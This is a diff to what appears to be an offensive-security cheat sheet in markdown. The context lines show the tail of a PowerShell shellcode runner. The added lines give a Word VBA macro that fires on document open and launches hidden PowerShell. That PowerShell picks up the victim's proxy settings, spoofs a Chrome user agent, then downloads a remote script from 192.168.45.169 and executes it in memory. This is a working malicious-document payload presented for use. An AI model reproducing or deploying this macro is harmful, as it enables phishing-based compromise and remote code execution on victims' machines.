@@ -78,7 +78,34 @@ $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
 [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
 ```
 
-Add this to a Microsoft Word Macro `AutoOpen()`:
+Use this **(with proxy aware and user agent)**:
+
+```vb
+Sub MyMacro()
+    Dim str As String
+    str = "powershell -Command """
+    str = str & "New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null; "
+    str = str & "$keys = Get-ChildItem 'HKU:\'; "
+    str = str & "ForEach ($key in $keys) {if ($key.Name -like '*S-1-5-21-*') {$start = $key.Name.substring(10);break}}; "
+    str = str & "$proxyAddr=(Get-ItemProperty -Path 'HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\').ProxyServer; "
+    str = str & "[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy('http://$proxyAddr'); "
+    str = str & "$wc = new-object system.net.WebClient; "
+    str = str & "$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36');"
+    str = str & "$wc.DownloadString('http://192.168.45.169/run.ps1') | IEX"""
+    Shell str, vbHide
+End Sub
+
+Sub Document_Open()
+  MyMacro
+End Sub
+
+Sub AutoOpen()
+  MyMacro
+End Sub
+```
+
+**try to use the one on top instead of this** Add this to a Microsoft Word Macro `AutoOpen()`:
+
 ```vb
 Sub MyMacro()
   Dim str As String
